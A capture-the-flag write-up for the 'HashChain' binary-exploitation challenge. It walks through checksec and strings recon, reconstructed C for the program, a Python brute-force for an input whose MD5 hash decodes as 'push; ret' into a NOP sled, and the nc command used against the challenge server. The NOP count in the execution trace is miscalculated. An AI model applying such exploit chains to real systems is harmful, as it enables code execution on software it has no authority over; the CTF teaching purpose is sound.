# HashChain — CTF Pwn Challenge Writeup

**Challenge:** HashChain
**Category:** Binary Exploitation (Pwn)
**Description:** *They said MD5 was broken. They said it was insecure. But they never said it could run.*
**Remote:** `52.59.124.14:5010`

---

## Table of Contents

1. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
2. [Phase 2 — Static Analysis](#phase-2--static-analysis)
3. [Phase 3 — Exploitation](#phase-3--exploitation)
4. [Key Concepts](#key-concepts)

---

## Phase 1 — Reconnaissance

> **Mindset:** Don't jump straight to exploitation. First understand what you're dealing with.

### Files provided

```
dist/
├── hashchain          ← the binary we attack
└── lib/
    ├── ld-linux.so.2
    ├── libc.so.6
    └── libcrypto.so.3  ← OpenSSL! hints at MD5/crypto usage
```

The challenge provides a custom `lib/` folder. This means the server runs specific versions of libc and libcrypto. Always use these when testing locally so your environment matches the server exactly:

```bash
LD_LIBRARY_PATH=./lib ./hashchain
```

### What kind of binary is this?

```bash
file hashchain
```

```
hashchain: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, not stripped
```

Key observations:
- **32-bit x86** — pointers are 4 bytes, different calling conventions from 64-bit
- **not stripped** — function names are preserved, makes reversing much easier

### Security protections

```bash
checksec hashchain
```

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

This is the most critical step. Break down each protection:

| Protection | Present? | What it means |
|---|---|---|
| Stack Canary | ❌ No | Stack overflows won't be detected |
| NX (No-eXecute) | ❌ **No** | **Stack, heap, and mmap regions are all executable** |
| PIE | ❌ No | All code/data addresses are **fixed** every single run |
| RELRO | Partial | GOT is partially writable |

**The critical finding: NX is disabled.** This means if we can get data (shellcode) into any writable region, the CPU will execute it. The program can literally run code we inject.

### What functions and strings does it use?

```bash
strings hashchain
```

Notable output:
```
flag.txt
MD5
doit
Welcome to HashChain!
mmap hash_buffer
mmap nop_sled
```

Imported functions:
```
fgets, strlen, strcmp, MD5, mmap, memset, printf, puts, fopen, fclose
```

**Observations:**
- Uses `mmap` — allocates memory regions (probably executable ones)
- Uses `MD5` from OpenSSL — hashes user input
- `"doit"` — looks like a magic trigger word
- `"flag.txt"` — there's a function that reads the flag file

### What we know after Phase 1

> This is a 32-bit binary with **no memory protections**. It does MD5 hashing, allocates executable memory with `mmap`, and has a magic word `"doit"`. There's something that reads `flag.txt`. Our job is to understand how those pieces connect.

---

## Phase 2 — Static Analysis

> **Mindset:** Read the code without running it. Understand every function and how memory is laid out.

### Running the binary first

Always run it at least once before diving into assembly. See what it looks like from the user's perspective:

```bash
LD_LIBRARY_PATH=./lib ./hashchain
```

```
Welcome to HashChain!
> hello
Hash 1 stored.
> world
Hash 2 stored.
> doit
Executing 2 hash(es) as code...
[crash — because MD5("hello") isn't valid shellcode]
```

**Learned from just running it:**
- Takes input in a loop
- Each input gets MD5-hashed and "stored"
- Typing `doit` stops the loop and **executes the stored hashes as code**
- With random input, it crashes because MD5 output isn't meaningful machine code

### Finding functions with symbols

```bash
nm hashchain | grep " T "
```

```
08049236 T win
080492bc T main
```

Two functions we care about:
- **`win` at `0x08049236`** — reads and prints the flag (our target)
- **`main` at `0x080492bc`** — the main program logic

### Disassembling with objdump

```bash
objdump -d -M intel hashchain
```

Or use GDB/pwndbg for interactive analysis:

```bash
gdb ./hashchain
```

```
pwndbg> info functions
pwndbg> disassemble win
pwndbg> disassemble main
```

### Understanding `win()` — the goal

```c
void win() {
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) return;

    char buf[256];
    fgets(buf, 256, f);
    printf("%s", buf);
    fclose(f);
}
```

Simple: opens `flag.txt` and prints it. Our goal is to **redirect execution here**.

### Understanding `main()` — the full logic

Reading through the disassembly and reconstructing the C pseudocode:

```c
int main() {
    // Disable output buffering
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    // ── SETUP: Two mmap calls ──

    // Region 1: stores MD5 hashes (will be executed as code)
    void *hash_buf = mmap(0x40000000, 0x640,
                          PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    // Region 2: the NOP sled
    void *nop_sled = mmap(0x41000000, 0x1000000,   // 16MB
                          PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    // Fill entire NOP sled with 0x90 (NOP instruction)
    memset(nop_sled, 0x90, 0x1000000);

    // Write a trampoline at the END of the NOP sled
    char *trampoline = (char*)nop_sled + 0xfffffa;
    trampoline[0]            = 0x68;        // push imm32
    *(uint32_t*)(trampoline+1) = (uint32_t)win;  // address of win()
    trampoline[5]            = 0xc3;        // ret

    puts("Welcome to HashChain!");

    // ── MAIN LOOP: up to 100 iterations ──
    int counter = 0;
    while (counter <= 99) {
        printf("> ");

        char input[256];
        fgets(input, 256, stdin);

        // Strip trailing newline
        int len = strlen(input);
        if (len > 0 && input[len-1] == '\n') {
            input[len-1] = '\0';
            len--;
        }

        // Magic word: stop hashing, go to execution
        if (strcmp(input, "doit") == 0) break;

        // Hash the input and store at hash_buf[counter * 16]
        MD5(input, len, (unsigned char*)hash_buf + counter * 16);
        printf("Hash %d stored.\n", counter + 1);
        counter++;
    }

    // ── EXECUTION ──
    if (counter == 0) {
        puts("No hashes to execute!");
        return 1;
    }

    printf("Executing %d hash(es) as code...\n", counter);
    ((void(*)())hash_buf)();   // ← call 0x40000000 as a function!

    return 0;
}
```

### Visualising memory layout

Draw this out — it's how real hackers think:

```
Address       Content                         Notes
──────────────────────────────────────────────────────────────
0x08049236    win() function                  Our target
...
0x40000000  ┌──────────────────────────────┐  hash_buf (RWX)
            │ MD5(input1)  [16 bytes]      │  ← offset 0x00
            │ MD5(input2)  [16 bytes]      │  ← offset 0x10
            │ MD5(input3)  [16 bytes]      │  ← offset 0x20
            │ ...                          │
            └──────────────────────────────┘
...
0x41000000  ┌──────────────────────────────┐  nop_sled (RWX, 16MB)
            │ 90 90 90 90 90 90 90 90 ...  │  ← NOP NOP NOP ...
            │ 90 90 90 90 90 90 90 90 ...  │
            │ (16 megabytes of 0x90)       │
            │                              │
0x41fffffa  │ 68 36 92 04 08               │  ← push 0x08049236 (win addr)
            │ c3                           │  ← ret
            └──────────────────────────────┘
```

### The "aha" moment — connecting the dots

1. `hash_buf` at `0x40000000` is **RWX** (readable, writable, AND executable)
2. Whatever MD5 hashes we store there get **executed as x86 machine code**
3. There's already a **NOP sled** at `0x41000000` — 16MB of `0x90` (no-op instruction)
4. At the end of the sled sits `push win; ret` — a trampoline to `win()`
5. **If the code at `0x40000000` jumps into the sled, it slides to win()**

The question becomes: **can we find an input string whose MD5 hash, when read as x86 instructions, jumps into `0x41000000`?**

### What we know after Phase 2

> The program stores MD5 hashes in executable memory at `0x40000000`, then runs them as code. A NOP sled at `0x41000000` already has a trampoline to `win()`. We need ONE MD5 hash that acts as a jump instruction into that sled.

---

## Phase 3 — Exploitation

> **Mindset:** We know exactly what we need. Now build the solution.

### Step 1: What x86 instruction jumps somewhere?

The simplest reliable way to jump to an arbitrary address in x86:

```asm
push 0x41??????    ; push target address onto stack
ret                ; pop top of stack into EIP — CPU jumps there
```

Why `push; ret` instead of just `jmp`?
- `jmp addr` encodes the address as a relative offset — harder to get right
- `push addr; ret` encodes the absolute address directly — simpler

In raw bytes:
```
68 XX XX XX 41 c3
│  └────────┘  └─── ret opcode
│    3 bytes:       (pops address, jumps)
│    low 3 bytes
│    of target addr
└── push opcode
```

The target just needs to land **anywhere** in the NOP sled (`0x41000000`–`0x41fffffe`). Since the sled is 16MB wide, any address whose high byte is `0x41` will land inside it.

### Step 2: What exact bytes do we need?

```
MD5 output position:  [0]   [1]  [2]  [3]  [4]   [5]   [6..15]
Required bytes:       0x68   ??   ??   ??  0x41  0xc3   (anything)
```

- Byte `[0]` = `0x68` → `push` opcode
- Bytes `[1]`–`[3]` = any value → low 3 bytes of address (all values land in sled)
- Byte `[4]` = `0x41` → high byte of target address (must point into sled)
- Byte `[5]` = `0xc3` → `ret` opcode
- Bytes `[6]`–`[15]` = don't matter (never reached after `ret`)

**Only 3 bytes need to be exact: positions 0, 4, and 5.**

### Step 3: What's the probability?

For any random input:

```
P(byte[0] == 0x68) = 1/256
P(byte[4] == 0x41) = 1/256
P(byte[5] == 0xc3) = 1/256

Combined: 1/256³ = 1/16,777,216
```

On average we need ~17 million inputs. Python can do ~5 million MD5s per second. Expected search time: **~3-4 seconds**. Very feasible.

### Step 4: Write the brute-force search

```python
import hashlib

for i in range(100_000_000):
    data = str(i).encode()          # try "0", "1", "2", ...
    h = hashlib.md5(data).digest()  # compute MD5

    # Check for push ??; ret pattern with 0x41 high byte
    if h[0] == 0x68 and h[4] == 0x41 and h[5] == 0xc3:
        print(f"Found: {data.decode()}")
        print(f"MD5:   {h.hex()}")
        # Show the push target address (little-endian bytes 1-4)
        addr = int.from_bytes(h[1:5], 'little')
        print(f"Instruction: push 0x{addr:08x}; ret")
        break
```

Output:
```
Found: 1074240
MD5:   681235ef41c3a69384f18180ec21bcab
Instruction: push 0x41ef3512; ret
```

### Step 5: Verify the find

```python
import hashlib
h = hashlib.md5(b'1074240').digest()
print(h.hex())
# 681235ef41c3a69384f18180ec21bcab

# Bytes 0-5: 68 12 35 ef 41 c3
# Decoded:   push 0x41ef3512; ret
# Target:    0x41ef3512 — is it in the sled?
print(hex(0x41ef3512))  # 0x41ef3512
# 0x41000000 <= 0x41ef3512 <= 0x41fffffa ✓ — yes, it's in the sled!
```

### Step 6: Trace the full execution path

```
[1] Program calls 0x40000000 as code

[2] At 0x40000000:
    68 12 35 ef 41    →  push 0x41ef3512
    c3                →  ret
    CPU jumps to 0x41ef3512

[3] At 0x41ef3512:
    90 90 90 90 ...   →  NOP NOP NOP NOP ...
    (slides through remaining ~67,576 NOPs)

[4] At 0x41fffffa:
    68 36 92 04 08    →  push 0x08049236  (win's address)
    c3                →  ret
    CPU jumps to win()

[5] win() opens flag.txt and prints the flag
```

### Step 7: Test locally

```bash
cd dist/
echo "flag{test_flag_local}" > flag.txt
printf '1074240\ndoit\n' | LD_LIBRARY_PATH=./lib ./hashchain
```

```
Welcome to HashChain!
> Hash 1 stored.
> Executing 1 hash(es) as code...
flag{test_flag_local}
```

It works.

### Step 8: Hit the remote server

```bash
printf '1074240\ndoit\n' | nc 52.59.124.14 5010
```

```
Welcome to HashChain!
> Hash 1 stored.
> Executing 1 hash(es) as code...
ENO{h4sh_ch41n_jump_t0_v1ct0ry}
```

---

## Key Concepts

### What is a NOP sled?

A NOP sled is a long sequence of `0x90` bytes (the x86 NOP — "no operation" — instruction). Each NOP does nothing except advance the instruction pointer by 1. So if you land anywhere in a NOP sled, execution "slides" forward until it hits real code at the end. It's a classic technique to make exploits more reliable — you don't need to hit an exact address, just get anywhere inside the sled.

```
0x41000000  90 90 90 90 ...  ← land here
0x41000001  90 90 90 90 ...  ← or here
0x41000002  90 90 90 90 ...  ← or here
...                           ← doesn't matter, all slide down
0x41fffffa  68 36 92 04 08   ← all paths lead here: push win; ret
```

### Why `push addr; ret` instead of `jmp addr`?

- `jmp rel32` uses a **relative** 32-bit offset from the current position. The offset changes depending on WHERE you're jumping FROM, making it harder to brute-force.
- `push imm32; ret` uses the **absolute** address directly — you just need the 4 bytes of the target in the instruction. Much simpler to search for.

### Why does MD5 "run"?

MD5 produces 16 bytes of output. Those 16 bytes are arbitrary binary data. When stored in executable memory and jumped to, the CPU interprets them as x86 machine instructions. Most combinations will be garbage or crash, but some combinations happen to be valid, useful instructions. We brute-forced until we found one that looks like `push addr; ret`.

### Why only 3 specific bytes needed?

Out of 16 bytes of MD5 output:
- Bytes `[0]`, `[4]`, `[5]` must be exact (`0x68`, `0x41`, `0xc3`)
- Bytes `[1]`–`[3]` just need to produce a 24-bit address with high byte `0x41` already fixed — any value works since the sled is 16MB wide
- Bytes `[6]`–`[15]` are never executed (after `ret`, CPU is elsewhere)

This is why the brute force is fast. Fewer constraints = faster search.

### Why is `push 0x41??????` safe?

The NOP sled covers the ENTIRE range `0x41000000`–`0x41fffffa`. The low 3 bytes of the pushed address can be literally anything (0x000000–0xfffffa), and execution will always land in the sled. This is the whole point of making the sled 16MB wide.

### Dynamic analysis commands (pwndbg reference)

```bash
# Start debugging
gdb ./hashchain

# Set library path if needed
set environment LD_LIBRARY_PATH ./lib

# List all functions
info functions

# Disassemble a function
disassemble main
disassemble win

# Set breakpoint and run
break main
run

# Examine memory
x/16xb 0x40000000    # show 16 bytes at hash_buf as hex
x/16xb 0x41fffffa    # show the trampoline at end of sled

# Step through instructions
si    # step one instruction (into calls)
ni    # step one instruction (over calls)

# Show registers
info registers
# or in pwndbg:
regs

# Show stack
x/20gx $esp

# Continue execution
continue

# Show memory mappings (see the mmap regions)
vmmap
# or:
info proc mappings
```

---

## Summary

| Phase | Question | Answer |
|---|---|---|
| **Recon** | What do I have? | 32-bit binary, no protections, uses MD5 and mmap |
| **Analysis** | What does it do? | Stores MD5 hashes in RWX memory at `0x40000000`, runs them as code |
| **Exploitation** | How do I win? | Find input whose MD5 = `push 0x41??????; ret` to jump into NOP sled |

**The punchline of the challenge title:** MD5 is "broken" cryptographically — but the real twist is that MD5 hashes can literally *run* as machine code. The NOP sled made exploitation forgiving: we only needed 3 correct bytes out of 16, which a simple brute-force script finds in seconds.

**Flag: `ENO{h4sh_ch41n_jump_t0_v1ct0ry}`**
